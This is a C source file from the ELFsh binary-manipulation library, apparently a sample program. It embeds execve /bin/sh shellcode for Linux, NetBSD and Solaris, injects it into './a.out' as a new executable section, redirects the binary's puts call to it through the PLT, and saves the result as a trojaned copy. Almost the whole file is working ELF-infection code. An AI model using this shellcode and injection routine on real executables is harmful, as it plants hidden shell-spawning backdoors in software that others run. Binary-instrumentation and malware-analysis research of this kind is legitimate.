/*
** sht_extend.c
**
** Started on  Sun Mar 17 05:57:23 2002 mayhem
** Last update Mon Jun 30 11:54:57 2003 jv
*/
#include "libelfsh.h"

#define         TROJANED_FILE   "./a.out"
#define         OUTPUT_FILE     "./fake_aout"



/* the first execve + exit shellcode I found in my tree, not a very short one ;) */
#if defined(__linux__)

char sc[] =
"\x31\xd2\x52\x68\x6E\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x52\x53\x89\xe1\x8D\x42\x0b"
"\xcd\x80\x31\xC0\x40\xcd\x80";

#elif defined(__NetBSD__)

char sc[] =
"\xeb\x0d\x5f\x31\xc0\x50\x89\xe2"
"\x52\x57\x54\xb0\x3b\xcd\x80\xe8"
"\xee\xff\xff\xff/bin/sh";

#elif defined(sun)

char sc[] =
"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
"\x2b\x0b\xda\xdc\xae\x15\x63\x68"
"\x90\x0b\x80\x0e\x92\x03\xa0\x0c"
"\x94\x10\x20\x10\x94\x22\xa0\x10"
"\x9c\x03\xa0\x14"
"\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
"\x91\xd0\x20\x08" ;

#else
 #error "This feature is not available on this OS"
#endif




/* test for non-mapped data */
char	*str = "stop looking at me ! \n";



/* Here we map the shellcode in a newly inserted mapped section (.devhell) and modify the entry point */
int		main(int argc, char **argv)
{
  elfshobj_t	*file;
  Elf32_Shdr	hdr;
  Elf32_Shdr	unmapped_hdr;
  elfshsect_t	*new;
  elfshsect_t	*unmapped_new;
  int		ret;

  /* Create the ELFsh binary descriptor (EBD) */
  file = elfsh_map_obj(TROJANED_FILE);
  if (!file)
    goto err;

  printf(" => Injection section and adding section header table entry ... \n");

  /* Create the section descriptor (ESD) */
  new = elfsh_create_section(".devhell");
  if (!new)
    goto err;

  /* Create a section header for the mapped section */
  hdr = elfsh_create_shdr(0, SHT_PROGBITS, SHF_EXECINSTR | SHF_ALLOC, 0, 0, sizeof(sc), 0, 0, 0, 0);

  /* Insert the section */
  if (elfsh_insert_mapped_section(file, new, hdr, sc, ELFSH_CODE_INJECTION) < 0)
    goto err;

  /* Retreive it again since the file offset and the vaddr may have been updated during insertion */
  new = elfsh_get_section_by_name(file, ".devhell", NULL, NULL, NULL);
  if (!new)
    goto err;

  /* Hijack puts */
  ret = elfsh_hijack_function_by_name(file,
                                      ELFSH_HIJACK_TYPE_PLT |  
                                      ELFSH_HIJACK_OS_ANY   |  
                                      ELFSH_HIJACK_CPU_ANY, 
                                      "puts", new->shdr->sh_addr);
  if (ret < 0)
    goto err;

  /* Now we save */
  ret = elfsh_save_obj(file, OUTPUT_FILE);
  if (ret < 0)
    goto err;

  printf("Relinking *OK*\n");
  return (0);

 err:
  elfsh_error();
  return (-1);
}
